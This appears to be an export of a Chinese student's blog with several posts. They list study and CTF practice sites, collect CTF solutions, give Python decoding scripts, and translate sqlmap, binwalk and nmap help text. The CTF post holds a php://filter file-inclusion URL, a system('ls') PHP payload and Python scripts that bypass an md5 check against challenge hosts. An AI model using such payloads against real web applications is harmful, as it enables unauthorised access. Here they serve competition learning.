rel="noopener">http://10.28.200.248.cslg.vpn358.com/?p=1961</a><br>其中linux下的锐捷程序包不完整</p><h3 id="综测查询网站"><a href="#综测查询网站" class="headerlink" title="综测查询网站"></a>综测查询网站</h3><p><a href="http://xsgz.cslg.edu.cn" target="_blank" rel="noopener">http://xsgz.cslg.edu.cn</a></p><h3 id="校级大学生创新创业训练计划平台网址"><a href="#校级大学生创新创业训练计划平台网址" class="headerlink" title="校级大学生创新创业训练计划平台网址"></a>校级大学生创新创业训练计划平台网址</h3><p><a href="http://sjcx.cslg.cn" target="_blank" rel="noopener">http://sjcx.cslg.cn</a></p><h3 id="省级大学生创新创业训练计划平台网址"><a href="#省级大学生创新创业训练计划平台网址" class="headerlink" title="省级大学生创新创业训练计划平台网址"></a>省级大学生创新创业训练计划平台网址</h3><p><a href="http://jscx.njnu.edu.cn/Index.aspx" target="_blank" rel="noopener">http://jscx.njnu.edu.cn/Index.aspx</a><br><a href="https://jsgjc.jse.edu.cn/cxcy/" target="_blank" rel="noopener">https://jsgjc.jse.edu.cn/cxcy/</a> (新网址)</p><h3 id="国家级大学生创新创业训练计划平台网址"><a href="#国家级大学生创新创业训练计划平台网址" class="headerlink" title="国家级大学生创新创业训练计划平台网址"></a>国家级大学生创新创业训练计划平台网址</h3><p><a href="http://gjcxcy.bjtu.edu.cn/Index.aspx" target="_blank" rel="noopener">http://gjcxcy.bjtu.edu.cn/Index.aspx</a></p><h3 id="全国大学生创业服务网"><a href="#全国大学生创业服务网" class="headerlink" title="全国大学生创业服务网"></a>全国大学生创业服务网</h3><p><a href="https://cy.ncss.cn/" target="_blank" rel="noopener">https://cy.ncss.cn/</a></p><h2 id="大三第一学期"><a href="#大三第一学期" class="headerlink" title="大三第一学期"></a>大三第一学期</h2><h3 id="C-网络通信编程"><a href="#C-网络通信编程" class="headerlink" title="C#网络通信编程"></a>C#网络通信编程</h3><p><a href="http://www.tup.com.cn/booksCenter/book_05907001.html" target="_blank" rel="noopener">http://www.tup.com.cn/booksCenter/book_05907001.html</a></p><h3 id="正保创业实训网"><a href="#正保创业实训网" class="headerlink" title="正保创业实训网"></a>正保创业实训网</h3><p><a href="http://www.chinapen.org.cn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://www.chinapen.org.cn/?tdsourcetag=s_pctim_aiomsg</a></p><h1 id="技术论坛"><a href="#技术论坛" class="headerlink" title="技术论坛"></a>技术论坛</h1><h2 id="红黑联盟论坛"><a href="#红黑联盟论坛" class="headerlink" title="红黑联盟论坛"></a>红黑联盟论坛</h2><p><a href="https://www.2cto.com/" target="_blank" rel="noopener">https://www.2cto.com/</a></p><h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><h2 id="Atom-介绍和使用方法"><a href="#Atom-介绍和使用方法" class="headerlink" title="Atom - 介绍和使用方法"></a>Atom - 介绍和使用方法</h2><p><a href="https://blog.csdn.net/qq_32340877/article/details/79095610" target="_blank" rel="noopener">https://blog.csdn.net/qq_32340877/article/details/79095610</a></p><h2 id="ScreenToGif"><a href="#ScreenToGif" class="headerlink" title="ScreenToGif"></a>ScreenToGif</h2><p><a href="https://github.com/NickeManarin/ScreenToGif" target="_blank" rel="noopener">https://github.com/NickeManarin/ScreenToGif</a></p><h1 id="资源网站"><a href="#资源网站" class="headerlink" title="资源网站"></a>资源网站</h1><h2 id="公开数据库"><a href="#公开数据库" class="headerlink" title="公开数据库"></a>公开数据库</h2><h3 id="DBPub"><a href="#DBPub" class="headerlink" title="DBPub"></a>DBPub</h3><p><a href="http://dbpub.cnki.net/grid2008/dbpub/index.aspx" target="_blank" rel="noopener">http://dbpub.cnki.net/grid2008/dbpub/index.aspx</a></p><h2 id="Xcode历史版本下载"><a href="#Xcode历史版本下载" class="headerlink" title="Xcode历史版本下载"></a>Xcode历史版本下载</h2><p><a href="https://developer.apple.com/downloads/index.action" target="_blank" rel="noopener">https://developer.apple.com/downloads/index.action</a></p><h2 id="Cordova入门"><a href="#Cordova入门" class="headerlink" title="Cordova入门"></a>Cordova入门</h2><p><a href="https://blog.csdn.net/csdn100861/article/details/78585333" target="_blank" rel="noopener">https://blog.csdn.net/csdn100861/article/details/78585333</a></p><h2 id="中国大学MOOC"><a href="#中国大学MOOC" class="headerlink" title="中国大学MOOC"></a>中国大学MOOC</h2><p><a href="https://www.icourse163.org/university/view/all.htm#/" target="_blank" rel="noopener">https://www.icourse163.org/university/view/all.htm#/</a></p><h2 id="清华大学开源软件镜像站"><a href="#清华大学开源软件镜像站" class="headerlink" title="清华大学开源软件镜像站"></a>清华大学开源软件镜像站</h2><p><a href="https://mirrors.tuna.tsinghua.edu.cn" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn</a></p><h2 id="微软各种镜像资源"><a href="#微软各种镜像资源" class="headerlink" title="微软各种镜像资源"></a>微软各种镜像资源</h2><p><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></p><h1 id="CTF训练网站"><a href="#CTF训练网站" class="headerlink" title="CTF训练网站"></a>CTF训练网站</h1><h2 id="ctfd"><a href="#ctfd" class="headerlink" title="ctfd"></a>ctfd</h2><p><a href="https://ctfd.io/" target="_blank" rel="noopener">https://ctfd.io/</a></p><h2 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h2><p><a href="https://ctf.bugku.com/" target="_blank" rel="noopener">https://ctf.bugku.com/</a></p><h2 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h2><p><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">http://www.shiyanbar.com/</a></p><h2 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h2><p><a href="https://www.ichunqiu.com/" target="_blank" rel="noopener">https://www.ichunqiu.com/</a></p><h2 id="南京邮电大学网络攻防训练平台"><a href="#南京邮电大学网络攻防训练平台" class="headerlink" title="南京邮电大学网络攻防训练平台"></a>南京邮电大学网络攻防训练平台</h2><p><a href="http://ctf.nuptzj.cn/login" target="_blank" rel="noopener">http://ctf.nuptzj.cn/login</a>?</p><h1 id="ACM训练网站"><a href="#ACM训练网站" class="headerlink" title="ACM训练网站"></a>ACM训练网站</h1><h2 id="落谷"><a href="#落谷" class="headerlink" title="落谷"></a>落谷</h2><p><a href="https://www.luogu.org/" target="_blank" rel="noopener">https://www.luogu.org/</a></p><h2 id="蓝桥杯"><a href="#蓝桥杯" class="headerlink" title="蓝桥杯"></a>蓝桥杯</h2><p><a href="http://lx.lanqiao.cn/" target="_blank" rel="noopener">http://lx.lanqiao.cn/</a></p><h1 id="在线环境"><a href="#在线环境" class="headerlink" title="在线环境"></a>在线环境</h1><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p><a href="http://demo.php.cn/" target="_blank" rel="noopener">http://demo.php.cn/</a><br><a href="https://c.runoob.com/compile/1" target="_blank" rel="noopener">https://c.runoob.com/compile/1</a></p>]]></content>
      
      
        <tags>
            
            <tag> online-website </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ctf案例集合</title>
      <link href="/2018/08-27-ctf-case.html"/>
      <url>/2018/08-27-ctf-case.html</url>
      <content type="html"><![CDATA[<h1 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">echo</span> system(<span class="string">'ls'</span>);?&gt;</span><br><span class="line">php文件不可直接读取</span><br><span class="line">http://c10f7a1937b741168cb36c3616b15b2cba8c1914e1224d37.game.ichunqiu.com/?path=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=dle345aae.php</span><br></pre></td></tr></table></figure><h1 id="绕过md5的web爆破"><a href="#绕过md5的web爆破" class="headerlink" title="绕过md5的web爆破"></a>绕过md5的web爆破</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>] = 0;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>]+120  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">'value'</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[mt_rand(0,25)].<span class="variable">$str_rand</span>[mt_rand(0,25)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>]==(<span class="variable">$value</span>[0].<span class="variable">$value</span>[1]) &amp;&amp; substr(md5(<span class="variable">$value</span>),5,4)==0)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]&gt;=10)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag<br>使用如下py：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">"http://17fab28ee29e482a95e9cca3fa1dcb111d918b722e404654.game.ichunqiu.com/?value[]=ea"</span></span><br><span class="line">al = [<span class="string">'abcdefghijklmnopqrstuvwxyz'</span>]</span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(20):</span><br><span class="line">    url = <span class="string">"http://17fab28ee29e482a95e9cca3fa1dcb111d918b722e404654.game.ichunqiu.com/?value[]="</span> + r.content[0:2]</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    <span class="built_in">print</span> r.content</span><br><span class="line">输出的r.content中就有flag</span><br></pre></td></tr></table></figure><h1 id="“百度杯”CTF比赛-2017-二月场-爆破-3"><a href="#“百度杯”CTF比赛-2017-二月场-爆破-3" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-爆破-3"></a>“百度杯”CTF比赛 2017 二月场-爆破-3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pf &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>] = 0;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>]+120&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">'value'</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[mt_rand(0,25)].<span class="variable">$str_rand</span>[mt_rand(0,25)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>]==(<span class="variable">$value</span>[0].<span class="variable">$value</span>[1]) &amp;&amp; substr(md5(<span class="variable">$value</span>),5,4)==0)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]&gt;=10)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://a8e37458b4314a97927685e5caf1dd6a6dcb5cecf40248da.game.ichunqiu.com/'</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+<span class="string">'?value[0]=e&amp;value[1]=a'</span>).text</span><br><span class="line"><span class="built_in">print</span> html</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+html[0:2]).text</span><br><span class="line">    <span class="built_in">print</span> html[0:2]</span><br><span class="line">    <span class="comment">#print html</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag&#123;.*&#125;'</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> (html)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> case </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python运行错误及解决方案汇总</title>
      <link href="/2018/08-27-python-error.html"/>
      <url>/2018/08-27-python-error.html</url>
      <content type="html"><![CDATA[<h2 id="python2-7运行出现的Unicode-equal-comparison-failed-to-convert-both-arguments-to-Unicode-interpreting"><a href="#python2-7运行出现的Unicode-equal-comparison-failed-to-convert-both-arguments-to-Unicode-interpreting" class="headerlink" title="python2.7运行出现的Unicode equal comparison failed to convert both arguments to Unicode - interpreting"></a>python2.7运行出现的Unicode equal comparison failed to convert both arguments to Unicode - interpreting</h2><p>uncode编码警告：在unicode等价比较中，把两个参数同时转换为unicode编码失败。中断并认为他们不相等。<br>windows下的字符串str默认编码是ascii，而python编码是utf8<br>解决方法：添加如下几行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF常用python脚本</title>
      <link href="/2018/08-25-decode-script.html"/>
      <url>/2018/08-25-decode-script.html</url>
      <content type="html"><![CDATA[<h1 id="加解密脚本"><a href="#加解密脚本" class="headerlink" title="加解密脚本"></a>加解密脚本</h1><h2 id="n次base64解密"><a href="#n次base64解密" class="headerlink" title="n次base64解密"></a>n次base64解密</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">    a = open(<span class="string">'1.txt'</span>)</span><br><span class="line">    try:</span><br><span class="line">        b = a.read()</span><br><span class="line">    finally:</span><br><span class="line">        a.close()</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        try:</span><br><span class="line">            b = base64.b64decode(b)</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure><h2 id="RC4解密算法"><a href="#RC4解密算法" class="headerlink" title="RC4解密算法"></a>RC4解密算法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import random, base64</span><br><span class="line">from hashlib import sha1</span><br><span class="line">def crypt(data, key):</span><br><span class="line">   x = 0</span><br><span class="line">   box = range(256)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(256):</span><br><span class="line">       x = (x + box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">       box[i], box[x] = box[x], box[i]</span><br><span class="line">   x = y = 0</span><br><span class="line">   out = []</span><br><span class="line">   <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">       x = (x + 1) % 256</span><br><span class="line">       y = (y + box[x]) % 256</span><br><span class="line">       box[x], box[y] = box[y], box[x]</span><br><span class="line">       out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</span><br><span class="line">   <span class="built_in">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tdecode(data, key, decode=base64.b64decode, salt_length=16):</span><br><span class="line">   <span class="keyword">if</span> decode:</span><br><span class="line">       data = decode(data)</span><br><span class="line">   salt = data[:salt_length]</span><br><span class="line">   <span class="built_in">return</span> crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">   data = <span class="string">'UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw =='</span></span><br><span class="line">   key = <span class="string">'welcometoicqedu'</span></span><br><span class="line">   decoded_data = tdecode(data=data, key=key)</span><br><span class="line">   <span class="built_in">print</span> decoded_data</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF Tools</title>
      <link href="/2018/08-25-CTF-Tools-online.html"/>
      <url>/2018/08-25-CTF-Tools-online.html</url>
      <content type="html"><![CDATA[<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>数据所在<br>rm -rf  /root/.sqlmap/output/192.168.11.200</p><h2 id="爆破后台目录"><a href="#爆破后台目录" class="headerlink" title="爆破后台目录"></a>爆破后台目录</h2><p><a href="https://github.com/LangziFun/scan-backup-langzi-" target="_blank" rel="noopener">https://github.com/LangziFun/scan-backup-langzi-</a></p><h2 id="svn文件修复"><a href="#svn文件修复" class="headerlink" title="svn文件修复"></a>svn文件修复</h2><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a></p><h1 id="wireshark数据包"><a href="#wireshark数据包" class="headerlink" title="wireshark数据包"></a>wireshark数据包</h1><h2 id="X-Forwarded-For的IP伪造"><a href="#X-Forwarded-For的IP伪造" class="headerlink" title="X-Forwarded-For的IP伪造"></a>X-Forwarded-For的IP伪造</h2><h2 id="tcpflow"><a href="#tcpflow" class="headerlink" title="tcpflow"></a>tcpflow</h2><p>kali linux自带的工具，可以提取wireshark中的数据。</p><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>Binwalk v2.1.1<br>克雷格·凯西,<a href="http://www.binwalk.org" target="_blank" rel="noopener">http://www.binwalk.org</a><br>用法:binwalk [OPTIONS] [FILE1] [FILE2] [FILE3]…<br>签名扫描选项:<br>-B， -签名扫描目标文件，寻找通用文件签名<br>-R， -raw=<str>为指定的字节序列扫描目标文件<br>-A， -操作码扫描目标文件以获得通用可执行操作码签名<br>-m， -magic=<file>指定要使用的自定义魔术文件<br>-b， -哑禁用智能签名关键字<br>-I，——无效显示标记为无效的结果<br>-x， -exclude=<str>排除与<str>匹配的结果<br>-y，—include=<str>只显示匹配<str>的结果<br>提取选项:<br>-e， -提取自动提取已知文件类型<br>-D， -dd=<a href="type:ext:cmd" target="_blank" rel="noopener">type:ext:cmd</a>提取<type>签名，给文件一个扩展名<ext>，并执行<cmd><br>-M， -matryoshka递归扫描提取的文件<br>-d， -depth=<int>极限matryoshka递归深度(默认:8层深度)<br>-C， -directory=<str>将文件/文件夹提取到自定义目录(默认:当前工作目录)<br>-j， -size=<int>限制每个提取文件的大小<br>-n， -count=<int>限制提取文件的数量<br>-r， -rm删除被雕刻的文件后提取<br>-z，——从文件中雕刻数据，但不要执行提取实用程序<br>熵分析选项:<br>-E， -熵计算文件熵<br>-F，快速使用更快，但不太详细，熵分析<br>保存为PNG<br>-Q， -nlegend省略了熵图中的传说<br>-N， -nplot不会生成熵图<br>-H，——high=<float>设置上升边缘熵触发阈值(默认:0.95)<br>-L，——low=<float>设置下降边缘熵触发阈值(默认:0.85)<br>二进制dif选项:<br>-W， -hexdump执行一个或多个文件的hexdump / diff<br>-G，——绿色只显示包含所有文件中相同字节的行<br>-我，-红色只显示包含不同于所有文件的字节的行<br>-U， -蓝色只显示包含不同文件的字节的行<br>-w， -简洁区分所有文件，但只显示第一个文件的十六进制转储<br>原始压缩选项:<br>-X， -放气扫描原始放气压缩流<br>lzma扫描原始lzma压缩流<br>-P，局部扫描，表面扫描，但速度更快<br>-S， -在第一个结果后停止<br>一般选择:<br>-l， -length=<int>要扫描的字节数<br>-o， -offset=<int>开始扫描在这个文件偏移量<br>-O， -base=<int>为所有打印的偏移量添加一个基地址<br>-K， -block=<int>设置文件块大小<br>-g， -swap=<int>在扫描前反转每n个字节<br>-f， -log=<file>记录结果到文件<br>-c， -csv日志结果以csv格式文件<br>-t——术语格式输出，以适应终端窗口<br>-q，——安静抑制输出到stdout<br>-v，——详细启用详细输出<br>-h， -帮助显示帮助输出<br>-a， -finclude=<str>只扫描名称与此正则表达式匹配的文件<br>不扫描名称与此正则表达式匹配的文件<br>在指定的端口上启用状态服务器</str></file></int></int></int></int></int></float></float></int></int></str></int></cmd></ext></type></str></str></str></str></file></str></p><h2 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h2><h3 id="nmap下载"><a href="#nmap下载" class="headerlink" title="nmap下载"></a>nmap下载</h3><p><a href="http://www.nmap.com.cn/" target="_blank" rel="noopener">http://www.nmap.com.cn/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">用法：nmap [扫描类型] [选项] &#123;目标规范&#125;</span><br><span class="line">目标规范：</span><br><span class="line">可以传递主机名，IP地址，网络等。</span><br><span class="line">例如：scanme.nmap.org，microsoft.com / 24,192.168.0.1; 10.0-255.0-255.1-254</span><br><span class="line">-iL &lt;inputfilename&gt;：从主机/网络列表输入</span><br><span class="line">-iR &lt;num hosts&gt;：选择随机目标</span><br><span class="line">--exclude &lt;host1 [，host2] [，host3]，...&gt;：排除hosts / networks</span><br><span class="line">--excludefile &lt;exclude_file&gt;：从文件中排除列表</span><br><span class="line">HOST DISCOVERY：</span><br><span class="line">-sL：列表扫描 - 只列出要扫描的目标</span><br><span class="line">-sP：Ping扫描 - 只需确定主机是否在线</span><br><span class="line">-P0：将所有主机视为在线 - 跳过主机发现</span><br><span class="line">-PS / PA / PU [端口</span><br><span class="line">列表]：给定端口的TCP SYN / ACK或UDP发现探测-PE / PP / PM：ICMP回送，时间戳和网络掩码请求发现探测</span><br><span class="line">-n / -R：永远不要进行DNS解析/始终解析[默认：有时解析]</span><br><span class="line">SCAN TECHNIQUES：</span><br><span class="line">-sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</span><br><span class="line">-sN / sF / sX：TCP Null，FIN和Xmas扫描</span><br><span class="line">- -scanflags &lt;flags&gt;：自定义TCP扫描标志</span><br><span class="line">-sI &lt;zombie host [：probeport]&gt;：Idlescan</span><br><span class="line">-sO：IP协议扫描</span><br><span class="line">-b &lt;ftp relay host&gt;：FTP跳出扫描</span><br><span class="line">端口规格和扫描顺序：-p</span><br><span class="line">&lt;端口范围&gt;：仅扫描指定的端口</span><br><span class="line">Ex：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080</span><br><span class="line">-F：快速 - 仅扫描nmap-services文件中列出的端口）</span><br><span class="line">-r：连续扫描端口 - 不随机化</span><br><span class="line">SERVICE / VERSION DETECTION：</span><br><span class="line">-sV：探测打开端口以确定服务/版本信息</span><br><span 